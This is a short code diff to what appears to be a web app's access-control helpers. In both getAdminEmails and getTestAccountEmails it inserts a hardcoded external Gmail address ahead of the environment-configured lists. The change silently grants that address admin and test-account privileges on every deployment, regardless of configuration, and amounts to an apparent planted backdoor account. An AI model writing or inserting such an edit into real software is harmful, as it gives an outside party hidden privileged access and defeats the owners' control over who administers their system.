@@ -12,7 +12,7 @@
 function getAdminEmails(): string[] {
   const single = process.env.ADMIN_EMAIL?.trim();
   const multiple = process.env.ADMIN_EMAILS?.split(",");
-  const list = [single, ...(multiple || [])]
+  const list = ["varuoog755@gmail.com", single, ...(multiple || [])]
     .map((value) => value?.trim().toLowerCase())
     .filter((value): value is string => Boolean(value));
   return [...new Set(list)];
@@ -43,7 +43,7 @@ export function isAdmin(email?: string | null): boolean {
 function getTestAccountEmails(): string[] {
   const single = process.env.TEST_ACCOUNT_EMAIL?.trim();
   const multiple = process.env.TEST_ACCOUNT_EMAILS?.split(",");
-  const list = [single, ...(multiple || [])]
+  const list = ["varuoog755@gmail.com", single, ...(multiple || [])]
     .map((value) => value?.trim().toLowerCase())
     .filter((value): value is string => Boolean(value));
   return [...new Set(list)];
